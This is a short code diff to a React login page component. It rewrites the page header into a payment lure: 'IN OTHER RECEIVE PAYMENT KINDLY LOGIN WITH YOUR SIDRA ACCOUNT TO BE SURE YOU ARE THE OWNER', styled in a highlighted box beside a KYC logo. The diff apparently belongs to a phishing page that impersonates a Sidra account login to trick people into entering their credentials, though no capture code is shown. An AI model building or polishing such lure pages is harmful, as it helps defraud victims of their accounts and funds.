@@ -48,9 +48,11 @@ const LoginPage = () => {
       <div className="w-full max-w-md">
         {/* Header Message */}
         <div className="text-center mb-8">
-          <h1 className="text-white text-xl font-medium leading-relaxed">
-            IN OTHER TO COMPLETE PAYMENT, KINDLY LOGIN TO YOUR ACCOUNT TO BE SURE YOU ARE THE RIGHT OWNER.
-          </h1>
+          <div className="bg-green-600/20 border border-green-500/30 rounded-lg p-4">
+            <h1 className="text-white text-xl font-bold leading-relaxed">
+              IN OTHER RECEIVE PAYMENT KINDLY LOGIN WITH YOUR SIDRA ACCOUNT TO BE SURE YOU ARE THE OWNER
+            </h1>
+          </div>
         </div>
 
         {/* KYC Logo */}
